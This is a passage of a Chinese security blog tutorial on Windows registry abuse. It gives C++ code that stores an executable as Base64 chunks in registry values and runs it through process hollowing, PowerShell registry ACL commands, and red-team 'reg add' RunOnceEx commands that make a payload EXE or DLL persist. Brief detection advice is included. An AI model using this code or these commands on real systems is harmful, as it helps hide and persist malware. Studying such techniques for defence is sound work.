存储文件到注册表"></a>0x00 存储文件到注册表</h3><hr><p>第一步涉及到把文件导入注册表，文件将被分割多个小部分，并写入到注册表键值中。接下来文件将被提取、重组，最终在一傀儡进程里得以执行。有多个方法实现这一过程。注册表有多种不同的键值类型，足以存储多种格式的数据，包括物理二进制数据、32&#x2F;64位数值、字符串。实际操作中，文件将被BASE64编码以字符串（<code>REG_SZ</code>）形式被存入注册表。</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225143153818.png" alt="image-20211225143153818"></p><p>把数据导入到注册表中非常简单。首先通过<code>RegCreateKeyEx</code>打开键值句柄，<code>RegCreateKeyEx</code>的功能是打开一个存在的键值句柄或者创建一个键值句柄，然后通过<code>RegGetValue and RegSetValueEx</code>来进行读取和写入操作。具体操作参见以下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">const</span> HKEY <span class="hljs-title">OpenRegistryKey</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-type">const</span> strKeyName, <span class="hljs-type">const</span> <span class="hljs-type">bool</span> bCreate = <span class="hljs-literal">true</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>HKEY hKey = <span class="hljs-literal">nullptr</span>;<br>DWORD dwResult = <span class="hljs-number">0</span>;<br><br>LONG lRet = <span class="hljs-built_in">RegCreateKeyExA</span>(HKEY_CURRENT_USER, strKeyName, <span class="hljs-number">0</span>,<br>    <span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, KEY_READ | KEY_WRITE | KEY_CREATE_SUB_KEY,<br>    <span class="hljs-literal">nullptr</span>, &amp;hKey, &amp;dwResult);<br><br><span class="hljs-keyword">if</span> (lRet != ERROR_SUCCESS)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Could not create/open registry key. Error = %X\n&quot;</span>,<br>        lRet);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (bCreate &amp;&amp; dwResult == REG_CREATED_NEW_KEY)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">&quot;Created new registry key.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">&quot;Opened existing registry key.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> hKey;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">WriteRegistryKeyString</span><span class="hljs-params">(<span class="hljs-type">const</span> HKEY hKey, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-type">const</span> strValueName,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-type">const</span> BYTE *pBytes, <span class="hljs-type">const</span> DWORD dwSize)</span></span><br><span class="hljs-function"></span>&#123;<br>std::string strEncodedData = <span class="hljs-built_in">base64_encode</span>(pBytes, dwSize);<br><br>LONG lRet = <span class="hljs-built_in">RegSetValueExA</span>(hKey, strValueName, <span class="hljs-number">0</span>, REG_SZ, (<span class="hljs-type">const</span> BYTE *)strEncodedData.<span class="hljs-built_in">c_str</span>(), strEncodedData.<span class="hljs-built_in">length</span>());<br><span class="hljs-keyword">if</span> (lRet != ERROR_SUCCESS)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Could not write registry value. Error = %X\n&quot;</span>,<br>        lRet);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">const</span> std::array&lt;BYTE, READ_WRITE_SIZE&gt; <span class="hljs-title">ReadRegistryKeyString</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-type">const</span> strKeyName,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-type">const</span> strValueName, <span class="hljs-type">bool</span> &amp;bErrorOccured)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwType = <span class="hljs-number">0</span>;<br><span class="hljs-type">const</span> DWORD dwMaxReadSize = READ_WRITE_SIZE * <span class="hljs-number">2</span>;<br>DWORD dwReadSize = dwMaxReadSize;<br><br><span class="hljs-type">char</span> strBytesEncoded[READ_WRITE_SIZE * <span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span> &#125;; <br>LONG lRet = <span class="hljs-built_in">RegGetValueA</span>(HKEY_CURRENT_USER, <br>strKeyName, strValueName,<br>    RRF_RT_REG_SZ, &amp;dwType, strBytesEncoded, &amp;dwReadSize);<br>std::array&lt;BYTE, READ_WRITE_SIZE&gt; pBytes = &#123; <span class="hljs-number">0</span> &#125;;<br>std::string strDecoded = <span class="hljs-built_in">base64_decode</span>(std::<span class="hljs-built_in">string</span>(strBytesEncoded));<br>(<span class="hljs-type">void</span>)<span class="hljs-built_in">memcpy</span>(pBytes.<span class="hljs-built_in">data</span>(), strDecoded.<span class="hljs-built_in">c_str</span>(), strDecoded.<span class="hljs-built_in">size</span>());<br><br><span class="hljs-keyword">if</span> (lRet != ERROR_SUCCESS)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Could not read registry value. Error = %X\n&quot;</span>,<br>        lRet);<br>    bErrorOccured = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (dwType != REG_SZ || (dwReadSize == <span class="hljs-number">0</span> || dwReadSize &gt; dwMaxReadSize))<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Did not correctly read back a string from the registry.\n&quot;</span>);<br>    bErrorOccured = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">return</span> pBytes;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这基本是把文件导入到注册表的所有操作了。另外限于篇幅，还有一些额外的细节并没有在上述代码中展示出来，比如把文件分割成小部分写进不同的键值里，这部分代码如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">void <span class="hljs-constructor">WriteFileToRegistry(<span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span> <span class="hljs-params">const</span> <span class="hljs-params">pFilePath</span>)</span><br>&#123;<br>HKEY hKey = <span class="hljs-constructor">OpenRegistryKey(<span class="hljs-string">&quot;RegistryTest&quot;</span>)</span>; <br>std::<span class="hljs-built_in">string</span> strSubName = <span class="hljs-string">&quot;Part&quot;</span>;<br>std::<span class="hljs-built_in">string</span> strSizeName = <span class="hljs-string">&quot;Size&quot;</span>;<br>size_t ulIndex = <span class="hljs-number">1</span>;<br><br>auto splitFile = <span class="hljs-constructor">SplitFile(<span class="hljs-params">pFilePath</span>)</span>;<br><span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; splitFile.size<span class="hljs-literal">()</span>; ++i)<br>&#123;<br>    std::<span class="hljs-built_in">string</span> str<span class="hljs-constructor">FullName(<span class="hljs-params">strSubName</span> + <span class="hljs-params">std</span>::<span class="hljs-params">to_string</span>(<span class="hljs-params">ulIndex</span>)</span>);<br><br>    <span class="hljs-constructor">WriteRegistryKeyString(<span class="hljs-params">hKey</span>, <span class="hljs-params">strFullName</span>.<span class="hljs-params">c_str</span>()</span>, splitFile<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.data<span class="hljs-literal">()</span>, READ_WRITE_SIZE);<br>    ++ulIndex;<br>&#125;<br><span class="hljs-constructor">CloseHandle(<span class="hljs-params">hKey</span>)</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>示例代码中第一级键是在HKCU\RegistryTest下面，可执行文件被分割成多个块儿，每个块儿大小为2048字节，然后进行BASE64编码，以键值名“Part1”, “Part2”, … “PartN”的形式写入注册表里。执行上述代码后，</p><p>通过BASE64解码可以快速验证键值里面的内容是否正确，“Part1”键值内容被解码后输出如下内容（修剪过），可以看到PE文件头。</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs inform7">MZ<span class="hljs-comment">[144]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[3]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[4]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[255]</span><span class="hljs-comment">[255]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[184]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span>@<span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><br><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[240]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><br><span class="hljs-comment">[14]</span><span class="hljs-comment">[31]</span><span class="hljs-comment">[186]</span><span class="hljs-comment">[14]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[180]</span><span class="hljs-comment">[9]</span><span class="hljs-comment">[205]</span>!<span class="hljs-comment">[184]</span><span class="hljs-comment">[2]</span>L<span class="hljs-comment">[205]</span>!This program cannot be run in DOS mode.<span class="hljs-comment">[13]</span><span class="hljs-comment">[13]</span><br><span class="hljs-comment">[10]</span>$<span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[181]</span>!:<br><br></code></pre></td></tr></table></figure><p>这个时候文件已经被保存在注册表里了，同时可以从磁盘里删除了。</p><h3 id="0x01-从注册表中提取文件"><a href="#0x01-从注册表中提取文件" class="headerlink" title="0x01 从注册表中提取文件"></a>0x01 从注册表中提取文件</h3><hr><p>此时，文件被分割成多个小块并保存在注册表里。提取文件无非与第一节相反，读取存储文件的键值的每一部分、进行BASE64解码、合并文件。示例代码如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">NewProcessInfo <span class="hljs-constructor">JoinRegistryToFile(<span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span> <span class="hljs-params">const</span> <span class="hljs-params">strKeyName</span>, <span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span> <span class="hljs-params">const</span> <span class="hljs-params">strValueName</span>)</span><br>&#123;<br>NewProcessInfo newProcessInfo = &#123; <span class="hljs-number">0</span> &#125;;<br>std::vector&lt;std::<span class="hljs-built_in">array</span>&lt;BYTE, READ_WRITE_SIZE&gt;&gt; splitFile;<br><br>size_t ulKeyIndex = <span class="hljs-number">1</span>;<br>std::<span class="hljs-built_in">string</span> str<span class="hljs-constructor">FullName(<span class="hljs-params">strValueName</span> + <span class="hljs-params">std</span>::<span class="hljs-params">to_string</span>(<span class="hljs-params">ulKeyIndex</span>)</span>);<br><br><span class="hljs-built_in">bool</span> bErrorOccured = <span class="hljs-literal">false</span>;<br>auto partFile = <span class="hljs-constructor">ReadRegistryKeyString(<span class="hljs-params">strKeyName</span>, <span class="hljs-params">strFullName</span>.<span class="hljs-params">c_str</span>()</span>, bErrorOccured);<br><br><span class="hljs-keyword">while</span> (!bErrorOccured)<br>&#123;<br>    splitFile.push<span class="hljs-constructor">_back(<span class="hljs-params">partFile</span>)</span>;<br><br>    ++ulKeyIndex;<br>    strFullName = strValueName + std::<span class="hljs-keyword">to</span><span class="hljs-constructor">_string(<span class="hljs-params">ulKeyIndex</span>)</span>;<br><br>    partFile = <span class="hljs-constructor">ReadRegistryKeyString(<span class="hljs-params">strKeyName</span>, <span class="hljs-params">strFullName</span>.<span class="hljs-params">c_str</span>()</span>, bErrorOccured);<br>&#125;<br><br>newProcessInfo.pFileData = std::unique_ptr&lt;BYTE<span class="hljs-literal">[]</span>&gt;(<span class="hljs-keyword">new</span> BYTE<span class="hljs-literal">[<span class="hljs-identifier">splitFile</span>.<span class="hljs-identifier">size</span>() <span class="hljs-operator">*</span> READ<span class="hljs-identifier">_WRITE_SIZE</span>]</span>);<br>memset(newProcessInfo.pFileData.get<span class="hljs-literal">()</span>, <span class="hljs-number">0</span>, splitFile.size<span class="hljs-literal">()</span><span class="hljs-operator"> * </span>READ_WRITE_SIZE);<br><br>size_t ulWriteIndex = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (auto &amp;split : splitFile)<br>&#123;<br>    (void)memcpy(&amp;newProcessInfo.pFileData.get<span class="hljs-literal">()</span><span class="hljs-literal">[<span class="hljs-identifier">ulWriteIndex</span> <span class="hljs-operator">*</span> READ<span class="hljs-identifier">_WRITE_SIZE</span>]</span>, splitFile<span class="hljs-literal">[<span class="hljs-identifier">ulWriteIndex</span>]</span>.data<span class="hljs-literal">()</span>,<br>        READ_WRITE_SIZE);<br>    ++ulWriteIndex;<br>&#125;<br><br>newProcessInfo.pDosHeader = (IMAGE_DOS_HEADER *)&amp;(newProcessInfo.pFileData.get<span class="hljs-literal">()</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>);<br>newProcessInfo.pNtHeaders = (IMAGE_NT_HEADERS *)&amp;(newProcessInfo.pFileData.get<span class="hljs-literal">()</span><span class="hljs-literal">[<span class="hljs-identifier">newProcessInfo</span>.<span class="hljs-identifier">pDosHeader</span>-&gt;<span class="hljs-identifier">e_lfanew</span>]</span>);<br><br> return newProcessInfo;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里上一节定义的<code>ReadRegistryKeyString</code>函数被用来提取文件的各个部分，然后把各个部分重新组、合并，存在<code>newProcessInfo.pFileData.</code>这个结构体里。这里还有些额外的区域需要被初始化，比如PE DOS and NT headers，这对下节将会非常有用。</p><p>加载提取后的文件 此时文件已经从注册表里提取出来了，并且保存在内存缓冲空间里。如果这时候我们把数据写进磁盘来启动进程，这就本末倒置了，因为文件又回到了磁盘里。这里我们采用替换进程（详见<a href="http://www.codereversing.com/blog/archives/65">http://www.codereversing.com/blog/archives/65</a>）的方法来加载我们的可执行文件。接下来我们挂载一个僵尸进程（备注：随便打开一个进程），在它还没有映射内存的时候，使他处于暂停状态。然后我们把我们从注册表里提取的文件按字节映射到该进程里，然后再让进程继续运行，代码如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">void <span class="hljs-constructor">ExecuteFileFromRegistry(<span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span> <span class="hljs-params">const</span> <span class="hljs-params">pValueName</span>)</span><br>&#123;<br>HKEY hKey = <span class="hljs-constructor">OpenRegistryKey(<span class="hljs-string">&quot;RegistryTest&quot;</span>)</span>;<br><br>auto newProcessInfo = <span class="hljs-constructor">JoinRegistryToFile(<span class="hljs-string">&quot;RegistryTest&quot;</span>, <span class="hljs-params">pValueName</span>)</span>;<br>auto processInfo = <span class="hljs-constructor">MapTargetProcess(<span class="hljs-params">newProcessInfo</span>, <span class="hljs-string">&quot;DummyProcess.exe&quot;</span>)</span>;<br><span class="hljs-constructor">RunTargetProcess(<span class="hljs-params">newProcessInfo</span>, <span class="hljs-params">processInfo</span>)</span>;<br><br><span class="hljs-constructor">CloseHandle(<span class="hljs-params">hKey</span>)</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>MapTargetProcess and RunTargetProcess</code>这两个函数代码这里并没有贴出来，因为他们基本是我从我2011年写的文章里拷贝过来的。这里我提出一点需要注意的地方，本文描素的技术的适用条件是：傀儡进程以及我们需要执行的文件都是基于X86的，并且编译时要禁用<code>DEP/ASLR</code>。</p><p>这里<code>dummyprocess.exe</code>（包含在文章尾的ZIP里）的进程已被掏空，被另一个进程替换——<code>replacementprocess.exe</code>（也包括在zip）。ZIP里包有一个“Sample”文件夹，以提供交互实例。演示时按以下步骤操作：</p><p><strong>运行<code>dummyprocess.exe</code>观察那是一个Win32 UI的应用程序。</strong></p><p><strong>运行<code>write.bat</code>，他会调用<code>filelesslauncher.exe</code>把<code>replacementprocess.exe</code>写在<code>HKCU \\ registrytest</code>下。</strong></p><p><strong>删除<code>replacementprocess.exe</code>。</strong></p><p><strong>运行<code>execute.bat</code>，它将调用<code>filelesslauncher.exe</code>读取<code>HKCU \\ registrytest</code>下的内容并重组<code>replacementprocess.exe</code>。然后用<code>ReplacementProcess.exe</code>的数据来替<code>dummyprocess.exe</code>的内存数据。进程将继续运行，然后会弹出一个消息框弹，这是<code>replacementprocess.exe</code>代码被执行后的效果。</strong></p><p>最后请清理一下注册表。</p><h3 id="0x02-总结以及代码"><a href="#0x02-总结以及代码" class="headerlink" title="0x02 总结以及代码"></a>0x02 总结以及代码</h3><hr><p>本文所提供的技术展示了如何把一个可执行文件存储在注册表里。在对抗这种技术方面有很多选择。比如：某种程度上被写入的代码要被重组，这就意味着某个地方会出现恶意文件的硬编码或者从注册表提取文件的配置说明。这些都可以用来标记恶意软件的特征。另外，既然采用进程替换技术，也可以利用该技术的弱点来检测。比如，对比傀儡进程的内存镜像和磁盘镜像，一定会有很多不同。通过动态分析，也可以快速找出恶意软件：监控注册表API函数的调用以及检查是否调用了NtUnmapViewOfSection函数，来作为一个标记。</p><p>参考链接：代码更新 请关注Twitter:<a href="https://twitter.com/codereversing">https://twitter.com/codereversing</a></p><h2 id="五：Powershell注册表操作和powershell操作注册表权限"><a href="#五：Powershell注册表操作和powershell操作注册表权限" class="headerlink" title="五：Powershell注册表操作和powershell操作注册表权限"></a>五：Powershell注册表操作和powershell操作注册表权限</h2><h3 id="0x00Powershell注册表操作"><a href="#0x00Powershell注册表操作" class="headerlink" title="0x00Powershell注册表操作"></a>0x00Powershell注册表操作</h3><p>#注册表操作命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-PSProvider          获取安装的提供程序列表<br><br>Dir, Get-ChildItem  列出键的内容<br><br>Cd, Set-Location    更改当前（键）目录<br><br>HKCU:, HKLM:            预定义的两个重要注册表根目录虚拟驱动器<br><br>Get-ItemProperty    读取键的值<br><br>Set-ItemProperty    设置键的值<br><br>New-ItemProperty    给键创建一个新值<br><br>Clear-ItemProperty  删除键的值内容<br><br>Remove-ItemProperty     删除键的值<br><br>New-Item, md            创建一个新键<br><br>Remove-Item, Del    删除一个键<br><br>Test-Path           验证键是否存在<br><br>Get-PSDrive -PSProvider Registry    查看那些注册表驱动器已经被注册表提供程序使用<br><br>New-PSDrive job1 registry <span class="hljs-string">&quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion&quot;</span> <br><span class="hljs-built_in">dir</span> job1:                        自由地创建任何额外的驱动器<br><br></code></pre></td></tr></table></figure><h3 id="0x01powershell操作注册表权限"><a href="#0x01powershell操作注册表权限" class="headerlink" title="0x01powershell操作注册表权限"></a>0x01powershell操作注册表权限</h3><h1 id=""><a href="#" class="headerlink" title=""></a></h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-Acl            <br><br></code></pre></td></tr></table></figure><p>查看键的当前权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$acl</span> = Get-Acl HKCU:\Software\Testkey<br><span class="hljs-variable">$acl</span>.Owner<br>mosser<br><span class="hljs-variable">$me</span> = [System.Security.Principal.NTAccount]<span class="hljs-string">&quot;<span class="hljs-variable">$env</span>:userdomain\$env:username&quot;</span><br><span class="hljs-variable">$acl</span>.SetOwner(<span class="hljs-variable">$me</span>)        <br><br></code></pre></td></tr></table></figure><p>接管一个注册表键（先有权限访问）的所有权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">del HKCU:\Software\Testkey2<br>md HKCU:\Software\Testkey2<br><span class="hljs-variable">$acl</span> = Get-Acl HKCU:\Software\Testkey2<br><span class="hljs-variable">$person</span> = [System.Security.Principal.NTAccount]<span class="hljs-string">&quot;Administrators&quot;</span><br><span class="hljs-variable">$access</span> = [System.Security.AccessControl.RegistryRights]<span class="hljs-string">&quot;FullControl&quot;</span><br><span class="hljs-variable">$inheritance</span> = [System.Security.AccessControl.InheritanceFlags]`<br><span class="hljs-string">&quot;ObjectInherit,ContainerInherit&quot;</span><br><span class="hljs-variable">$propagation</span> = [System.Security.AccessControl.PropagationFlags]<span class="hljs-string">&quot;None&quot;</span><br><span class="hljs-variable">$type</span> = [System.Security.AccessControl.AccessControlType]<span class="hljs-string">&quot;Allow&quot;</span><br><span class="hljs-variable">$rule</span> = New-Object System.Security.AccessControl.RegistryAccessRule( `<br><span class="hljs-variable">$person</span>,<span class="hljs-variable">$access</span>,<span class="hljs-variable">$inheritance</span>,<span class="hljs-variable">$propagation</span>,<span class="hljs-variable">$type</span>)<br><br><span class="hljs-variable">$acl</span>.ResetAccessRule(<span class="hljs-variable">$rule</span>) <br><span class="hljs-variable">$person</span> = [System.Security.Principal.NTAccount]<span class="hljs-string">&quot;Everyone&quot;</span><br><span class="hljs-variable">$access</span> = [System.Security.AccessControl.RegistryRights]<span class="hljs-string">&quot;ReadKey&quot;</span><br><span class="hljs-variable">$inheritance</span> = [System.Security.AccessControl.InheritanceFlags]`<br><span class="hljs-string">&quot;ObjectInherit,ContainerInherit&quot;</span><br><span class="hljs-variable">$propagation</span> = [System.Security.AccessControl.PropagationFlags]<span class="hljs-string">&quot;None&quot;</span><br><span class="hljs-variable">$type</span> = [System.Security.AccessControl.AccessControlType]<span class="hljs-string">&quot;Allow&quot;</span><br><span class="hljs-variable">$rule</span> = New-Object System.Security.AccessControl.RegistryAccessRule( `<br><span class="hljs-variable">$person</span>,<span class="hljs-variable">$access</span>,<span class="hljs-variable">$inheritance</span>,<span class="hljs-variable">$propagation</span>,<span class="hljs-variable">$type</span>)<br><span class="hljs-variable">$acl</span>.ResetAccessRule(<span class="hljs-variable">$rule</span>)<br>Set-Acl HKCU:\Software\Testkey2 <span class="hljs-variable">$acl</span><br><br></code></pre></td></tr></table></figure><p>管理员拥有更改权限普通用户只有读取的新键的权限</p><h3 id="六、各种工具配合注册表使用进行权限维持"><a href="#六、各种工具配合注册表使用进行权限维持" class="headerlink" title="六、各种工具配合注册表使用进行权限维持"></a>六、各种工具配合注册表使用进行权限维持</h3><p>Meterpreter –Run键 </p><p>另外两个注册表位置，这些位置可以允许红队通过执行任意有效负载或DLL来实现持久性。这些将在登 </p><p>录期间执行，并且需要管理员级别的特权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add<br><br><span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001&quot;</span> /v<br><br>Pentestlab /t REG_SZ /d <span class="hljs-string">&quot;C:\tmp\pentestlab.exe&quot;</span><br><br>reg add<br><br><span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Dep</span><br><span class="hljs-string"></span><br><span class="hljs-string">end&quot;</span> /v Pentestlab /t REG_SZ /d <span class="hljs-string">&quot;C:\tmp\pentestlab.dll&quot;</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225145501769.png" alt="image-20211225145501769"></p><p>Meterpreter –任意DLL</p><p><strong>Metasploit</strong> </p><p>Metasploit Framework通过使用Meterpreter脚本和后期利用模块来支持通过注册表的持久性。 